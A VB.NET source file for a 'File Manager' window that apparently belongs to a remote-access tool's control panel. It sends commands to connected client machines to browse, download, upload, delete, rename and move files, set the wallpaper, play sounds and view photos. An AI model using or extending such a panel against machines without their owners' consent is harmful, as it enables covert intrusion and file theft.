﻿Public Class File_Manager
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then
                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True


                ElseIf data.Contains("[MyBase64/Photo]") And data.StartsWith("[MyBase64/Photo]") Then
                    Dim spl_Photo() As String = {"[MyBase64/Photo]"}
                    Dim b() As String = data.Split(spl_Photo, StringSplitOptions.RemoveEmptyEntries)


                    Dim Converts() As Byte = Convert.FromBase64String(b(0))
                    Dim ms As New IO.MemoryStream(Converts)
                    Dim base64 As New Bitmap(Image.FromStream(ms))
                    PictureBox1.Image = base64
                    ms.Dispose()
                    PictureBox1.Visible = True
                    If Panel3.Visible = True Then Panel3.Visible = False
                Else
                    DataGridView1.Rows.Clear()
                    ComboBox1.Items.Clear()
                    Dim spl_paths() As String = {Form1.s.split_paths}
                    Dim p() As String = data.Split(spl_paths, StringSplitOptions.RemoveEmptyEntries)
                    For u% = 1 To p.Length - 1
                        ComboBox1.Items.Add(p(u))
                    Next
                    Dim spl_LN() As String = {Form1.s.split_Line}

                    Dim ln() As String = p(0).Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                    For i As Integer = 0 To ln.Length - 1
                        Dim split_Ary() As String = {Form1.s.split_Ary}
                        Dim Ary() As String = ln(i).Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                        If Not Ary(0) = "-1" And Not Ary(1) = "-1" And Not Ary(2) = "-1" Then
                            Dim ext$ = Nothing
                            Dim s As Boolean = True
                            Select Case Ary(0)
                                Case "Ext"

                                    Try
                                        Dim f As New IO.FileInfo(Ary(1))
                                        ext = (f.Extension)
                                    Catch ex As Exception
                                        ext = "Unknown error"
                                    End Try



                                Case Else
                                    ext = (Ary(0))
                                    If ext.StartsWith("Folder Files") = True Then
                                        s = False
                                    End If
                            End Select
                            Dim Size_0$ = Nothing
                            If s = True Then
                                Size_0 = store_0.FormatFileSize(CLng(Ary(2)))
                            End If
                            Dim index_image As Integer = 0
                            If ext.StartsWith("Folder Files") = True Then
                                index_image = imageList_0.Images.IndexOfKey("Folder Files".ToUpper)
                            Else
                                index_image = imageList_0.Images.IndexOfKey(ext.ToUpper)
                            End If
                            Select Case index_image
                                Case -1
                                    index_image = imageList_0.Images.IndexOfKey("-1".ToUpper)
                            End Select
                            DataGridView1.Rows.Add(imageList_0.Images(index_image), Ary(1), Size_0, ext)
                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(1).Tag = Ary(3) + "/" + Ary(1) ' path and name
                            If s = True Then DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(2).Tag = Ary(2)



                        End If
                        ComboBox1.Text = Ary(3)
                    Next

                    If Panel3.Visible = True Then Panel3.Visible = False


                    refres_title()
                End If
            End If
            ComboBox1.Enabled = True


        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub


#Region " Open the file using "
    Private Sub ContextMenuOpen_the_file_using()
        Try
            Dim ContextMenu2 As ContextMenuStrip
            ContextMenu2 = New ContextMenuStrip
            Me.ContextMenuStrip = ContextMenuStrip1
            ContextMenu2.ShowImageMargin = False
            ContextMenu2.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
            OpenTheFileUsingToolStripMenuItem.DropDown = ContextMenu2
            Dim Path_file$ = Application.StartupPath + "\" + store_0.name_folder_app_resource + "\" + "OBU.inf"
            If System.IO.File.Exists(Path_file) Then
                Dim objReader As New System.IO.StreamReader(Path_file)
                Dim i% = 0
                Do While objReader.Peek() <> -1
                    Threading.Thread.Sleep(store_0.CPU)
                    Dim line$ = objReader.ReadLine()
                    If Not line = Nothing Then
                        If line.Contains("{Package}") Then
                            Dim spl_Package() As String = {"{Package}"}
                            If spl_Package.Length = 1 Then
                                Dim p() As String = line.ToString.Split(spl_Package, StringSplitOptions.RemoveEmptyEntries)
                                Dim menu As New ToolStripMenuItem() With {.Text = CStr(p(0)), .Name = "menu_item" + CStr(i), .Tag = CStr(p(1))}
                                AddHandler menu.Click, AddressOf mnuItem_Clicked
                                ContextMenu2.Items.Add(menu)
                            End If
                        End If
                    End If
                    i += 1
                Loop
            End If
            ContextMenu2.Renderer = New Theme_0
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub mnuItem_Clicked(sender As Object, e As EventArgs)
        Dim item As ToolStripMenuItem = TryCast(sender, ToolStripMenuItem)
        Dim tag_0$ = item.Tag
        If Not tag_0 = Nothing Then
            If DataGridView1.SelectedRows.Count > 0 Then
                For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                    Dim p$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Tag

                    Form1.s.Send(handle_Number_Client, "file_manager_start_playback" + Form1.s.SplitData + p + Form1.s.SplitData + tag_0)

                Next
            End If
        End If



    End Sub

#End Region

    Private Sub File_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        OpenTheFileUsingToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_app")

        RenameToolStripMenuItem.Image = store_0.Bitmap_0("ctx_rename")


        RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")

        UploadFileToolStripMenuItem.Image = store_0.Bitmap_0("ctx_upload_file")

        DownloadToolStripMenuItem.Image = store_0.Bitmap_0("ctx_download_file")

        CutToolStripMenuItem.Image = store_0.Bitmap_0("ctx_cut")

        CopyToolStripMenuItem.Image = store_0.Bitmap_0("ctx_copy")

        PasteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_paste")

        EditfileToolStripMenuItem.Image = store_0.Bitmap_0("ctx_edit")

        DeleteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")

        AddFilesToolStripMenuItem.Image = store_0.Bitmap_0("ctx_add")

        SetWallpaperToolStripMenuItem.Image = store_0.Bitmap_0("ctx_wallpaper")

        Download02ToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_folder")

        PlayASoundToolStripMenuItem.Image = store_0.Bitmap_0("ctx_play")


        ContextMenuStrip1.Renderer = New Theme_0
#Region " imageList Files "
        Dim b As Boolean = False
        Dim List_Files As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\icons\file_manager\")
        Dim i As String
        For Each i In List_Files
            If b = False Then
                Me.icon_0.Width = Bitmap.FromFile(i).Size.Width
                imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                b = True
            End If
            Dim FilePath As String = i
            Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
            imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
        Next
#End Region
        Me.Icon = store_0.icons_0("window")
        Button1.Image = store_0.Bitmap_0("chevron_right")
        Button2.Image = store_0.Bitmap_0("chevron_left")
        ContextMenuOpen_the_file_using()
        refres_title()
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("File Manager" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
        Text = title
    End Sub

    Private Sub DataGridView1_CellMouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseDoubleClick
        If e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0 Then
            If ComboBox1.Enabled = True Then
                If DataGridView1.SelectedRows.Count = 1 Then
                    For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                        Dim iFF$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                        If iFF.StartsWith("Folder Files") = True Then
                            Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                            ComboBox1.Enabled = False
                            Form1.s.Send(handle_Number_Client, "file_manager" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                            If Button2.Enabled = True Then
                                Button2.Enabled = False
                                Button2.Tag = Nothing
                                Button1.Focus()
                            End If
                        End If
                    Next
                End If
            End If
        End If
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        refres_title()






    End Sub
    Private Sub ComboBox1_SelectionChangeCommitted(sender As Object, e As EventArgs) Handles ComboBox1.SelectionChangeCommitted
        If ComboBox1.Enabled = True Then
            Dim selectedItem As Object
            selectedItem = ComboBox1.SelectedItem
            If selectedItem.ToString() IsNot Nothing Then
                ComboBox1.Enabled = False
                Form1.s.Send(handle_Number_Client, "file_manager" + Form1.s.SplitData + selectedItem.ToString())
                If Button2.Enabled = True Then
                    Button2.Enabled = False
                    Button2.Tag = Nothing
                    Button1.Focus()
                End If
            End If
        End If
    End Sub
    Private Sub ComboBox1_MouseWheel(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseWheel
        Dim mwe As HandledMouseEventArgs = DirectCast(e, HandledMouseEventArgs)
        mwe.Handled = True
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If ComboBox1.Enabled = True Then
            ComboBox1.Enabled = False
            Form1.s.Send(handle_Number_Client, "file_manager" + Form1.s.SplitData + ComboBox1.Text)
        ElseIf ComboBox1.Enabled = False Then
            ComboBox1.Enabled = True
            Button2.Enabled = False
            Button2.Tag = Nothing
            Button1.Focus()
        End If
    End Sub
    Private Sub ComboBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseMove
        ComboBox1.Enabled = True
    End Sub
    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub


#Region " back & next "
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If ComboBox1.Enabled = True Then
                Dim a0, a1, a2, spl As String
                spl = "/"
                a0 = ComboBox1.Text
                a1 = spl
                If a0 = Nothing Then Exit Sub
                If a0 = spl Then Exit Sub
                Dim e0 As New System.Text.RegularExpressions.Regex(a1)
                Dim e1 As System.Text.RegularExpressions.MatchCollection : e1 = e0.Matches(a0)
                a2 = a0.Split(spl)(e1.Count.ToString())
                Button2.Tag += spl + a2
                Try
                    Dim a() As String = {spl}
                    Dim b$ = Nothing : Dim ej() As String = ComboBox1.Text.Split(a, StringSplitOptions.None)
                    For i% = 0 To ej.Length - 2
                        If Not i = ej.Length - 2 Then
                            b += ej(i) + spl
                        Else
                            b += ej(i)
                        End If
                    Next
                    ComboBox1.Text = b
                Catch
                    ComboBox1.Text = ComboBox1.Text.Replace("/" + a2, Nothing)
                End Try
                If ComboBox1.Text = Nothing Then ComboBox1.Text = "/"
                Button2.Enabled = True
                ComboBox1.Enabled = False
                Form1.s.Send(handle_Number_Client, "file_manager" + Form1.s.SplitData + ComboBox1.Text)
            End If
        Catch
        End Try
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            If ComboBox1.Enabled = True Then
                Dim a0, a1, a2, spl As String
                spl = "/"
                a1 = spl
                a0 = Button2.Tag.ToString
                If a0 = Nothing Then
                    Button2.Enabled = False
                    Button1.Focus()
                    Exit Sub
                End If
                Dim e0 As New System.Text.RegularExpressions.Regex(a1)
                Dim e1 As System.Text.RegularExpressions.MatchCollection : e1 = e0.Matches(a0)
                a2 = a0.Split(spl)(e1.Count.ToString())
                If ComboBox1.Text = spl Then
                    ComboBox1.Text = ComboBox1.Text + a2
                Else
                    ComboBox1.Text = ComboBox1.Text + spl + a2
                End If
                Try
                    Dim a() As String = {spl}
                    Dim b$ = Nothing : Dim ej() As String = a0.Split(a, StringSplitOptions.None)
                    For i% = 0 To ej.Length - 2
                        If Not i = ej.Length - 2 Then
                            b += ej(i) + spl
                        Else
                            b += ej(i)
                        End If
                    Next
                    Button2.Tag = b
                    If Button2.Tag.ToString = Nothing Then
                        Button2.Enabled = False
                        Button1.Focus()
                    End If
                Catch
                    Button2.Tag = Button2.Tag.Replace(spl + a2, Nothing)
                End Try
                ComboBox1.Enabled = False
                Form1.s.Send(handle_Number_Client, "file_manager" + Form1.s.SplitData + ComboBox1.Text)
            End If
        Catch
        End Try
    End Sub
#End Region
#Region " UploadFile & DownloadFile "
    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click

        Dim alll$ = "All (*.*)|*.*"
        OpenFileDialog1.Filter = alll
        OpenFileDialog1.FilterIndex = 0
        OpenFileDialog1.FileName = Nothing
        If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim info As New IO.FileInfo(OpenFileDialog1.FileName)
            Form1.s.Send(handle_Number_Client, "upload_file" + Form1.s.SplitData + ComboBox1.Text + Form1.s.SplitData + info.Name + Form1.s.SplitData + tobase64(OpenFileDialog1.FileName))
        End If
    End Sub
    Function tobase64(file As String)
        Return Convert.ToBase64String(IO.File.ReadAllBytes(file))
    End Function
    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim p$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Tag
                If Not p = Nothing Then
                    Dim ch$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                    If ch.StartsWith("Folder Files") = False Then
                        Form1.s.Send(handle_Number_Client, "download_manager" + Form1.s.SplitData + DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Tag)
                    End If
                End If
            Next
        End If
    End Sub






#End Region
    Private Sub EditfileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditfileToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim iFF$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                If iFF.StartsWith("Folder Files") = False Then
                    Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                    Form1.s.Send(handle_Number_Client, "notepad" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                End If
            Next
        End If
    End Sub

    Private Sub Download02ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Download02ToolStripMenuItem.Click
        'Next
        Try
            Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client & Client_ID & "\" & "Download_Manager"
            If Not My.Computer.FileSystem.DirectoryExists(f) Then
                My.Computer.FileSystem.CreateDirectory(f)
            End If
            Process.Start(f)
        Catch ex As Exception

        End Try





    End Sub

    Private Sub AddFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddFilesToolStripMenuItem.Click








        Dim a As New Add_Files
        a.ShowDialog()
        If a.DialogResult = DialogResult.OK Then
            Dim resultName As String = a.TextBox1.Text
            Dim Iffile As Boolean = True
            If resultName.Contains(".") Then
                Iffile = False
            End If
            Dim path$ = ComboBox1.Text + "/" + resultName


            Form1.s.Send(handle_Number_Client, "file_manager_write_file" + Form1.s.SplitData + path + Form1.s.SplitData + CStr(Iffile))

        End If
        a.Dispose()
        a.Close()

    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click







        Dim GetName$ = Nothing
        Dim GetPath$ = Nothing
        If DataGridView1.SelectedRows.Count = 1 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1

                GetName = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                GetPath = ComboBox1.Text + "/" + GetName
            Next
            Dim a As New Files_Rename
            a.TextBox1.Text = GetName
            a.ShowDialog()
            If a.DialogResult = DialogResult.OK Then
                Dim resultNewName As String = a.TextBox1.Text
                Dim pathNew$ = ComboBox1.Text + "/" + resultNewName
                Form1.s.Send(handle_Number_Client, "file_manager_rename" + Form1.s.SplitData + GetPath + Form1.s.SplitData + pathNew)
            End If
            a.Dispose()
            a.Close()
        End If

    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                Form1.s.Send(handle_Number_Client, "file_manager_delete" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                DataGridView1.Rows.RemoveAt(DataGridView1.SelectedRows(i).Index)
            Next
        End If







    End Sub

#Region " Cut & Copy & Paste"
    Private Clipboard_Cut, Path_Cut, Clipboard_Copy, Path_Copy As String

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged

    End Sub

    Private Sub OpenTheFileUsingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenTheFileUsingToolStripMenuItem.Click

    End Sub

    Private Sub ContextMenuStrip1_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening

        Dim Size_1@ = 0
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim sz$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag
                If Not sz = Nothing Then
                    Try
                        Size_1 += CLng(sz)
                    Catch ex As Exception
                        'MsgBox(ex.ToString)
                    End Try

                End If
            Next
        End If
        Try
            DownloadToolStripMenuItem.Text = "Download (" + store_0.FormatFileSize(Size_1) + ")"
        Catch ex As Exception
            'MsgBox(ex.ToString)
            DownloadToolStripMenuItem.Text = "Download"

        End Try




    End Sub

    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub

    Private Sub SetWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim ex$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                If ex.ToLower = ".png" OrElse ex = ".jpg" Then
                    Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                    Form1.s.Send(handle_Number_Client, "set_wallpaper" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                End If
            Next
        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Clipboard_Copy = Nothing : Path_Copy = Nothing
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                Clipboard_Cut = Clipboard_Cut + n + "[*N\O*]"
                Path_Cut = Path_Cut + ComboBox1.Text + "/" + "[*P\T*]"
            Next
        End If
    End Sub

    Private Sub PlayASoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayASoundToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim ex$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                'If ex.ToLower = ".png" OrElse ex = ".jpg" Then
                Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                Form1.s.Send(handle_Number_Client, "play_sound" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                'End If
            Next
        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Clipboard_Cut = Nothing : Path_Cut = Nothing
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                Clipboard_Copy = Clipboard_Copy + n + "[*N\O*]"
                Path_Copy = Path_Copy + ComboBox1.Text + "/" + "[*P\T*]"
            Next
        End If
    End Sub

    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        If Not Clipboard_Copy = Nothing Then
            If Not Path_Copy = Nothing Then
                Dim a1() As String = {"[*N\O*]"}
                Dim w1() As String = Clipboard_Copy.Split(a1, StringSplitOptions.RemoveEmptyEntries)
                Dim a2() As String = {"[*P\T*]"}
                Dim w2() As String = Path_Copy.Split(a2, StringSplitOptions.RemoveEmptyEntries)
                For mi As Integer = 0 To w1.LongLength - 1
                    Form1.s.Send(handle_Number_Client, "file_manager_move_file" + Form1.s.SplitData + w2(mi) + Form1.s.SplitData + w1(mi) + Form1.s.SplitData + ComboBox1.Text + "/" + Form1.s.SplitData + CStr(False))
                Next
            End If
        End If
        '----------------------------------------------------------------------------------'
        If Not Clipboard_Cut = Nothing Then
            If Not Path_Cut = Nothing Then
                Dim a1() As String = {"[*N\O*]"}
                Dim w1() As String = Clipboard_Cut.Split(a1, StringSplitOptions.RemoveEmptyEntries)
                Dim a2() As String = {"[*P\T*]"}
                Dim w2() As String = Path_Cut.Split(a2, StringSplitOptions.RemoveEmptyEntries)
                For mi As Integer = 0 To w1.LongLength - 1
                    Form1.s.Send(handle_Number_Client, "file_manager_move_file" + Form1.s.SplitData + w2(mi) + Form1.s.SplitData + w1(mi) + Form1.s.SplitData + ComboBox1.Text + "/" + Form1.s.SplitData + CStr(True))
                Next
            End If
        End If

    End Sub

    Private Sub DataGridView1_CellMouseClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        If DataGridView1.SelectedRows.Count = 1 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Dim ex$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Value
                If ex.ToLower = ".png" OrElse ex = ".jpg" OrElse ex = ".gif" Then
                    Dim n$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                    Form1.s.Send(handle_Number_Client, "view_photo" + Form1.s.SplitData + ComboBox1.Text + "/" + n)
                Else

                    If PictureBox1.Visible = True Then PictureBox1.Visible = False
                End If

            Next
        End If
    End Sub
#End Region

End Class